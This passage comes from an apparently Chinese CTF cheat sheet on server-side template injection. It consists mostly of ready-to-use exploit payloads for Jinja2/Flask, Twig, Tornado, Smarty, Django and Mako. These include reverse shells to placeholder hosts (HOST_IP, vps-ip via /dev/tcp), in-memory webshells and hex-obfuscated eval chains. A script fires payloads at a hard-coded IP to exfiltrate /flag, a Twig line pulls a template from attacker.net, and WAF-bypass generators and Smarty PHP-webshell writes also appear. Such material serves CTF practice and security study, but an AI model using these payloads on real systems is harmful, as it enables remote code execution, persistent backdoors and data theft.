socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;HOST_IP&quot;,Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)')}}</code></pre><h5 id="容器无网">容器无网</h5><h6 id="写内存马">写内存马</h6><pre><code>add_url_rule写马（高版本已经不可用）：{{config.__class__.__init__.__globals__['__builtins__'].eval(&quot;__import__('sys').modules['__main__'].__dict__['app'].add_url_rule('/flag',lambda:__import__('os').popen('cat /flag').read())&quot;)}} #写一次后就会爆500{{url_for.__globals__['__builtins__']['eval'](&quot;app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())&quot;,{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}} #传cmd参数request.add_response_callback写马：{{cycler.__init__.__globals__.__builtins__['exec'](&quot;request.add_response_callback(lambda request, response: setattr(response,'text', __import__('os').popen('whoami').read()))&quot;,{'request': request})}}过滤了点的写法：{{cycler['__init__']['__globals__']['__builtins__']['exec'](&quot;getattr(request,'add_response_callback')(lambda request,response:setattr(response, 'text', getattr(getattr(__import__('os'),'popen')('whoami'),'read')()))&quot;,{'request': request})}}请求头返回马：{{cycler['__init__']['__globals__']['__builtins__']['setattr'](cycler['__init__']['__globals__']['__builtins__']['__import__']('sys')['modules']['wsgiref']['simple_server']['ServerHandler'],'http_version',cycler['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']())}}before_request写马：https://blog.csdn.net/2301_80148821/article/details/143237394{%set gl%3d'_'*2%2b'globals'%2b'_'*2%}{%set bu%3d'_'*2%2b'builtins'%2b'_'*2%}{%set im%3d'_'*2%2b'i''mport'%2b'_'*2%}{%set ay%3d'so'[%3a%3a-1]%}{{cycler.next[gl][bu]['ev'%2b'al'](&quot;_&quot;%2b&quot;_imp&quot;%2b&quot;ort_&quot;%2b&quot;_('s&quot;%2b&quot;ys').modules['_&quot;%2b&quot;_main_&quot;%2b&quot;_']._&quot;%2b&quot;_dict_&quot;%2b&quot;_['app'].before_request_funcs.setdefault(None,[]).append(lambda%3a'&lt;pre&gt;{0}&lt;/pre&gt;'.format(_&quot;%2b&quot;_impo&quot;%2b&quot;rt_&quot;%2b&quot;_('o&quot;%2b&quot;s').po&quot;%2b&quot;pen('cat%20/flag').read()))&quot;)}}{{self['_''_init_''_']['_''_globals_''_']['_''_builtins_''_']['ev''al'](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x73\x79\x73\x27\x29\x2e\x6d\x6f\x64\x75\x6c\x65\x73\x5b\x27\x5f\x5f\x6d\x61\x69\x6e\x5f\x5f\x27\x5d\x2e\x5f\x5f\x64\x69\x63\x74\x5f\x5f\x5b\x27\x61\x70\x70\x27\x5d\x2e\x62\x65\x66\x6f\x72\x65\x5f\x72\x65\x71\x75\x65\x73\x74\x5f\x66\x75\x6e\x63\x73\x2e\x73\x65\x74\x64\x65\x66\x61\x75\x6c\x74\x28\x4e\x6f\x6e\x65\x2c\x5b\x5d\x29\x2e\x61\x70\x70\x65\x6e\x64\x28\x6c\x61\x6d\x62\x64\x61\x20\x3a\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29\x29&quot;)}}</code></pre><h6 id="写静态文件">写静态文件</h6><p>脚本 From <a href="https://bili33.top/posts/CTF-CISCN2024-Preliminary-round-Writeup/">https://bili33.top/posts/CTF-CISCN2024-Preliminary-round-Writeup/</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_number</span>(<span class="params">num: <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">    num_map = &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&quot;([]|length)&quot;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&quot;([g]|length)&quot;</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="string">&quot;(()|select|string|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="string">&quot;(()|select|string|urlencode|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="string">&quot;([g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="string">&quot;([g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">20</span>: <span class="string">&quot;([g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="string">&quot;([g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">28</span>: <span class="string">&quot;([g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">32</span>: <span class="string">&quot;([g,g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">36</span>: <span class="string">&quot;([g,g,g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">40</span>: <span class="string">&quot;([g,g,g,g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">44</span>: <span class="string">&quot;([g,g,g,g,g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">48</span>: <span class="string">&quot;([g,g,g,g,g,g,g,g,g,g,g,g]|wordcount)&quot;</span>,</span><br><span class="line">        <span class="number">106</span>: <span class="string">&quot;([config,config]|wordcount)&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keys = <span class="built_in">sorted</span>(num_map.keys(), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">while</span> num &gt;= i:</span><br><span class="line">            num -= i</span><br><span class="line">            r.append(num_map[i])</span><br><span class="line"></span><br><span class="line">    final_number = <span class="string">f&quot;(([<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join(r)&#125;</span>])|sum)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> final_number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">use_c</span>(<span class="params">target</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># format_c = &#x27;(()|select|string|urlencode)[0]~(()|select|string)[15]&#x27; # %c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># format_c = &#x27;(()|select|string|urlencode)|attr(\&#x27;__getitem__\&#x27;)(0)~(()|select|string)|attr(\&#x27;__getitem__\&#x27;)(15)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在每个payload开头加上: &#123;% set c = (()|select|string|urlencode)[0]~(()|select|string)[15] %&#125;</span></span><br><span class="line">    <span class="comment"># 则format_c 可以这样写: format_c = &#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">    format_c = <span class="string">&quot;((()|select|string|urlencode)[0]~(()|select|string)[15])&quot;</span></span><br><span class="line">    format_s = (<span class="string">&quot;%s~&quot;</span> * <span class="built_in">len</span>(target))[:-<span class="number">1</span>]  <span class="comment"># %s~%s~%s~%s~ ....</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">False</span>:  <span class="comment"># 不使用波浪线</span></span><br><span class="line">        <span class="comment"># 用join 替代波浪线</span></span><br><span class="line">        format_c = <span class="string">&quot;[(()|select|string|urlencode)[0],(()|select|string)[15]]|join&quot;</span></span><br><span class="line">        format_s = <span class="string">&quot;[&quot;</span> + (<span class="string">&quot;,&quot;</span>.join([<span class="string">&quot;%s&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target))])) + <span class="string">&quot;]|join&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span>:  <span class="comment"># 不使用数字</span></span><br><span class="line">            format_c = <span class="string">f&quot;[(()|select|string|urlencode)[<span class="subst">&#123;generate_number(<span class="number">0</span>)&#125;</span>],(()|select|string)[<span class="subst">&#123;generate_number(<span class="number">15</span>)&#125;</span>]]|join&quot;</span></span><br><span class="line">            format_s = <span class="string">&quot;[&quot;</span> + (<span class="string">&quot;,&quot;</span>.join([<span class="string">&quot;%s&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target))])) + <span class="string">&quot;]|join&quot;</span></span><br><span class="line"></span><br><span class="line">    format_tuple = (format_c,) * <span class="built_in">len</span>(target)</span><br><span class="line"></span><br><span class="line">    _class_ascii = <span class="string">&quot;,&quot;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> target])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># _class_ascii = &#x27;,&#x27;.join([generate_number(ord(c)) for c in target])</span></span><br><span class="line"></span><br><span class="line">    format_tuple += (_class_ascii,)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># |format() 和 % 可以平替</span></span><br><span class="line">    result = <span class="string">f&quot;((<span class="subst">&#123;format_s&#125;</span>)|format(%s))&quot;</span></span><br><span class="line">    <span class="comment"># result = f&#x27;((&#123;format_s&#125;)%%(%s))&#x27;</span></span><br><span class="line"></span><br><span class="line">    result = result % format_tuple</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2chr</span>(<span class="params">string</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">        r += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>)+&quot;</span></span><br><span class="line">    <span class="keyword">return</span> r[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2ascii</span>(<span class="params">string</span>):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">        r += <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>,&quot;</span></span><br><span class="line">    <span class="keyword">return</span> r[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload2</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># v2 不使用 []</span></span><br><span class="line">    <span class="comment"># 使用字符：&#123;&#123; &#x27; () ~ | attr select string urlencode format lipsum</span></span><br><span class="line">    <span class="comment"># 使用时候把 use_c 的 format_c 改一下</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lipsum,url_for,get_flashed_messages 可互换</span></span><br><span class="line">    payload = (</span><br><span class="line">        <span class="string">&quot;&#123;&#123;get_flashed_messages|attr(%s)|attr(%s)(%s)|attr(%s)(%s)(%s)|attr(%s)(%s)|attr(%s)()&#125;&#125;&quot;</span></span><br><span class="line">        % (</span><br><span class="line">            use_c(<span class="string">&quot;__globals__&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;get&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;__builtins__&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;get&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;__import__&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;os&quot;</span>),</span><br><span class="line">            use_c(<span class="string">&quot;popen&quot;</span>),</span><br><span class="line">            use_c(cmd),</span><br><span class="line">            use_c(<span class="string">&quot;read&quot;</span>),</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.105.45.179:30722/&quot;</span></span><br><span class="line"></span><br><span class="line">requests.post(url=url, data=&#123;<span class="string">&quot;code&quot;</span>: payload2(<span class="string">&quot;mkdir /app/static&quot;</span>)&#125;)</span><br><span class="line">requests.post(url=url, data=&#123;<span class="string">&quot;code&quot;</span>: payload2(<span class="string">&quot;cat /flag &gt; /app/static/flag.html&quot;</span>)&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一点关于-ssti-的绕过">一点关于 ssti 的绕过</h3><p>()是不可绕过的<br>但如果 unicode 开着可以试试用全角括号绕过<br>(=&gt;%EF%BC%88<br>)=&gt;%EF%BC%89</p><h4 id="过滤了双大括号">过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线">过滤了下划线</h4><p>{{()|select|string}}<br>结果为<br>&lt;generator object select_or_reject at 0x0000025FC4517520&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x0000025FC4517520&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># 24</span></span><br><span class="line"><span class="comment"># &#123;&#123;(()|select|string)[24]&#125;&#125;</span></span><br></pre></td></tr></table></figure><pre><code>{%set u=(()|select|string)[24]*2%}{{u}}{%set%20u=(()|select|string)[24]*2%}{{''[u%2b&quot;class&quot;%2bu][u%2b&quot;class&quot;%2bu]}}</code></pre><h4 id="过滤点，中括号">过滤点，中括号</h4><h5 id="获取属性">获取属性</h5><p>. [] 和 |attr() 可以互换（仅限获取属性）</p><pre><code>{{''.__class__.__base__}}{{''['__class__']['__base__']}}{{''|attr('__class__')|attr('__base__')}}{{''.__getattribute__('__class__')}}注意的是__getattribute__不能连接，因为__getattribute__是对象方法，不是全局函数</code></pre><p>当需要字符串里过滤时用 getattr</p><pre><code>request.add_response_callbackgetattr(request,'add_response_callback')__import__('os').popen('whoami').read()getattr(getattr(__import__('os'),'popen')('whoami'),'read')()或者选择编码绕过</code></pre><h5 id="获取键值或下标">获取键值或下标</h5><p>dict 类型可用 __getitem__,pop,get,setdefault<br>list 类型可用__getitem__,pop<br>tuple 类型可用 __getitem__,first,last,random<br>也可以先转换成 list，此时要加括号以防优先级问题</p><pre><code>{{''.__class__.__mro__[1].__subclasses__()}}{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}{{(''.__class__.__mro__|first()).__subclasses__()}}{{(''.__class__.__mro__|list).pop(1).__subclasses__()}}</code></pre><h4 id="字符串绕过（关键字屏蔽）">字符串绕过（关键字屏蔽）</h4><p>先把关键字用字符串表示</p><h5 id="字符串拼接">字符串拼接</h5><ul><li>[‘__class__’] -&gt; [‘_'’_cl’‘ass_’‘_’]</li><li>[‘__class__’] -&gt; [‘__ssalc__’[::-1]]</li></ul><h5 id="格式化">格式化</h5><pre><code>&quot;__class__&quot;{%set cl=&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)%}{{''[cl]}}{%set cl=&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)%}{{''[cl]}}{%set cl='%c%c%c%c%c%c%c%c%c'%(95,95,99,108,97,115,115,95,95)%}{{''[cl]}}</code></pre><h5 id="编码绕过">编码绕过</h5><p>（1）unicode</p><ul><li>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到</li></ul><p>（2）hex 十六进制</p><ul><li>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</li></ul><p>（3）Octal 八进制</p><ul><li>__class__-&gt;[‘\137\137\143\154\141\163\163’]</li></ul><h5 id="request-绕过">request 绕过</h5><p>request.args 对应 get 请求<br>request.form 对应 post 请求<br>可以直接帮你绕过引号内的内容。</p><pre><code>{{lipsum.__globals__.os.popen(&quot;whoami&quot;).read()}}{{lipsum[request.args.gl][request.args.o][request.args.p](request.args.cmd)[request.args.r]()}}&amp;gl=__globals__&amp;o=os&amp;p=popen&amp;cmd=whoami&amp;r=read{{(lipsum|attr(request.args.gl)).get(request.args.o)|attr(request.args.p)(request.args.cmd)|attr(request.args.r)()}}&amp;gl=__globals__&amp;o=os&amp;p=popen&amp;cmd=whoami&amp;r=read</code></pre><h4 id="限制了-payload-长度">限制了 payload 长度</h4><pre><code>{%set x=config.update(a=config.update)%}   //此时字典中a的值被更新为config全局对象中的update方法{%set x=config.a(f=lipsum.__globals__)%}   //f的值被更新为lipsum.__globals__{%set x=config.a(o=config.f.os)%}          //o的值被更新为lipsum.__globals__.os{%set x=config.a(p=config.o.popen)%}       //p的值被更新为lipsum.__globals__.os.popen{{config.p(&quot;cat /f*&quot;).read()}}{%print(config)%}                          //输出config字典的所有键值对{%print(config.o)%}                        //输出</code></pre><h4 id="chr-绕过">chr 绕过</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__['__builtins__'].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还要先拿到 chr 函数，局限偏大。</p><h4 id="fenjing-一把梭">fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本">fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>,</span><br><span class="line">        <span class="string">&quot;self&quot;</span>,</span><br><span class="line">        <span class="string">&quot;g&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os&quot;</span>,</span><br><span class="line">        <span class="string">&quot;class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;length&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mro&quot;</span>,</span><br><span class="line">        <span class="string">&quot;base&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    full_payload_gen = fenjing.FullPayloadGen(waf)</span><br><span class="line">    shell_payload, _ = fenjing.exec_cmd_payload(waf, cmd)  <span class="comment"># 执行系统命令</span></span><br><span class="line">    <span class="comment"># config_payload = fenjing.config_payload(waf) #查看config文件</span></span><br><span class="line">    <span class="comment"># eval_payload, _ = full_payload_gen.generate(</span></span><br><span class="line">    <span class="comment">#     fenjing.const.EVAL, (fenjing.const.STRING, cmd)</span></span><br><span class="line">    <span class="comment"># )  # 执行python命令</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;eval_payload=&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显&quot;</span>)</span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig-PHP">Twig(PHP)</h2><ul><li><p>{{7*7}} = 49</p></li><li><p>${7*7} = ${7*7}</p></li><li><p>{{7*‘7’}} = 49</p></li><li><p>{{1/0}} = Error</p></li><li><p>{{foobar}} Nothing</p><pre><code>  #Get Info  {{_self}} #(Ref. to current application)  {{_self.env}}  {{dump(app)}}  {{app.request.server.all|join(',')}}  #File read  &quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@  #Exec code  {{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;whoami&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}  {{['id']|filter('system')}}  {{['cat\x20/etc/passwd']|filter('system')}}  {{['cat$IFS/etc/passwd']|filter('system')}}  {{['id',&quot;&quot;]|sort('system')}}  #Hide warnings and errors for automatic exploitation  {{[&quot;error_reporting&quot;, &quot;0&quot;]|sort(&quot;ini_set&quot;)}}</code></pre></li></ul><h2 id="Tornado-render-python">Tornado render(python)</h2><ul><li><p>{{7*7}} = 49</p></li><li><p>${7*7} = ${7*7}</p></li><li><p>{{foobar}} = Error</p></li><li><p>{{7*‘7’}} = 7777777</p><pre><code>  0.获取基础  {{handler.settings}}  1.直接读取文件  {% extend /proc/self/environ %}  {% include /proc/self/environ %}  2.直接调用函数  {{__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()}}  {{eval('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}}  {{eval('__import__(&quot;os&quot;).popen(&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/port 0&gt;&amp;1&quot;).read()')}}  3.导入库  {% import os %}{{ os.popen(&quot;whoami&quot;).read() }}  4.类似flask注入,payload部分通用(所以有时过滤小括号)  {{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[num].__init__.__globals__[&quot;popen&quot;]('ls').read()}}  {{&quot;&quot;.__class__.__mro__[-1].__subclasses__()[num].__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;)}}  5.tornado特有  {{handler.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;)}}  {{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval'](&quot;__import__('os').popen('ls').read()&quot;)}}  {% raw &quot;__import__('os').popen('ls').read()&quot;%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}  绕过过滤方法  1.过滤{{}}  {%autoescape None%}{% raw ... %}等同于{{...}}  {%autoescape None%}{% raw eval('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')%}  2.过滤关键字和引号时，类似flask使用参数绕过  {{eval(handler.get_argument(request.method))}}&amp;GET=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()  POST同理  3.过滤了小括号未过滤引号  {% raw &quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}  4.过滤小括号和引号  payload可以这么改变：  __import__('os').popen('bash -c \'bash -i &gt;&amp; /dev/tcp/vps-ip/port &lt;&amp;1\'')%0a&quot;&quot;&quot;%0a&amp;ssti={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&amp;%0a&quot;&quot;&quot;（没成功）  注：下面成功了  ssti={% set _tt_utf8 =eval %}{% raw request.body_arguments[request.method][0] %}&amp;POST=__import__('os').popen(&quot;bash -c 'bash -i &gt;%26 /dev/tcp/vps-ip/port &lt;%261'&quot;)</code></pre></li></ul><h2 id="smarty-PHP">smarty(PHP)</h2><pre><code>{$smarty.version}{if phpinfo()}{/if}{if readfile('/flag')}{/if}php5可用{literal}标签{literal}alert('xss');{/literal}{literal}&lt;script&gt;language=&quot;php&quot;&gt;xxx&lt;/script&gt;;{/literal}3.1前可用{php}标签{php}phpinfo();{/php}#3.1.30已弃用getStreamVariable{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name='rce(){};@eval($_POST[1]);function%0a%0a'}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;,self::clearConfig())}CVE-2021-26120 pocstring:{function name='rce(){};phpinfo();function '}{/function}CVE-2021-26119 pocstring:{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:{system(&quot;ls /&quot;)}')}</code></pre><h2 id="Django">Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre><h2 id="Mako-python">Mako(python)</h2><pre><code>&lt;%import osx=os.popen('id').read()%&gt;${x}</code></pre><h2 id="GoLang">GoLang</h2><p>在 Go 的模板引擎中，可以通过特定的有效负载来确认其使用情况：</p><ul><li><p>{{ . }}：显示数据结构输入。例如，如果具有 Password attribute 时， {{ .Password }} 可能会暴露它。</p></li><li><p>{{printf “%s” “ssti” }}：应显示字符串 “ssti”。</p></li><li><p>{{html “ssti”}}、 {{js “ssti”}}：这些有效负载应返回 “ssti” ，而不附加 “html” 或 “js”</p></li></ul><p>对于 Go 中通过 SSTI 的 RCE，可以调用对象方法。例如，如果提供的对象具有 System 方法执行命令，它可以被利用，例如 {{ .System “ls” }}。访问源代码通常是利用这一点所必需的，如给定的示例所示：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span 